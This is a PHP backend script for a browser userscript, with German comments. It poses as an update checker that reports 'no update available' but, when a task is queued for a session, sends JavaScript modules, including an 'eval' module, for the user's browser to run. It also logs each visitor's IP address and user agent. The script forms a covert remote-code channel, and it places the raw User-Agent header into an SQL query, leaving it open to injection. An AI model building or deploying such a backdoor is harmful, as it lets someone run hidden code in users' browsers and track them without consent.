<?php

include_once("ui/config.php");

$agent = $_SERVER["HTTP_USER_AGENT"];
$ip = $_SERVER["REMOTE_ADDR"];
$id = (int)$_GET["id"];
$version = $_GET["version"];

//if($version){

	$task = mysqli_query($con, "SELECT * FROM user WHERE session = '".session_id()."' AND do_ != 'wait' ORDER BY time DESC LIMIT 1");
	$do = (mysqli_num_rows($task) == 1) ? mysqli_fetch_object($task)->do_ : "wait";
	mysqli_query($con, "INSERT INTO user (ip, agent, time, do_, session) VALUES('".$ip."', '".$agent."', '".time()."', '".$do."', '".session_id()."')");
//}
//else
//	$do = "wait";

if($do == "wait"){
	if(!$version)
		$version = "NaN";
	echo "//Es ist Version ".$version." installiert.\n//Kein Update vorhanden.\n";
}
else{
	//echo "alert('Wird JavaScript ausgefuehrt?');";
	print_code("jquery");
	print_code("basic");
	//echo "GM_setValue('gmtime', '".time()."');\n";
	$tasks = unserialize($do);
	foreach($tasks as $value){
		print_code($value);
	}
	print_code("eval");

}

//Updater
/*
$ver_arr = explode(".", $version);
$link = "http://userscripts.org/scripts/source/".$id.".meta.js";
$meta = @file_get_contents($link);
if($meta){
	preg_match_all("~//\s\@version\s{6}((\d\.?)*)(\s.*?)*~", $meta, $out);
	if($out[1][0] != $version && $version != "NaN"){
		$installed = explode(".", $version);
		$current = explode(".", $out[1][0]);
		$c = 0;
		foreach($current as $value){
			if((int)$current[$c] > (int)$installed[$c]){
				echo "var update = parseInt(GM_getValue('update'));\n";
				echo "if((".time()." - update) >= 60*60*24){\n";
				echo "	window.location = 'http://userscripts.org/scripts/source/".$id.".user.js';\n";
				echo "}\n";
				echo "GM_setValue('update', '".time()."');\n";
				break;
			}
			$c++;
		}
	}
}
*/
?>